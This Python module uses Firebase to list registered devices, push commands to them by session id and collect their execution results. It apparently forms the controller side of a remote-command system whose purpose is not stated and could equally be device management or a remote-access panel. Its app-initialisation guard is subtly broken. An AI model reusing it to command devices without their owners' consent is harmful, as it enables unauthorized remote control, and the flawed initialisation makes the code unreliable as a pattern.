import os
import firebase_admin
from firebase_admin import credentials, db
import json

# Load dari environment variables
SERVICE_ACCOUNT = {
    "type": "service_account",
    "project_id": os.getenv("FB_PROJECT_ID"),
    "private_key_id": os.getenv("FB_PRIVATE_KEY_ID"),
    "private_key": os.getenv("FB_PRIVATE_KEY").replace('\\n', '\n'),
    "client_email": os.getenv("FB_CLIENT_EMAIL"),
    "client_id": os.getenv("FB_CLIENT_ID"),
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": os.getenv("FB_CLIENT_CERT_URL"),
    "universe_domain": "googleapis.com"
}

# Inisialisasi Firebase
if not firebase_admin.get_app():
    try:
        cred = credentials.Certificate(SERVICE_ACCOUNT)
        firebase_admin.initialize_app(cred, {
            'databaseURL': os.getenv("FB_DATABASE_URL")
        })
    except Exception as e:
        print(f"Firebase init error: {e}")

def get_devices():
    """Ambil semua device yang register"""
    ref = db.reference('devices')
    devices = ref.get()
    return devices if devices else {}

def send_command(session_id, command):
    """Kirim command ke device via Firebase"""
    ref = db.reference(f'commands/{session_id}')
    ref.set(command)

def get_results(session_id):
    """Ambil hasil eksekusi dari device"""
    ref = db.reference(f'results/{session_id}')
    return ref.get()
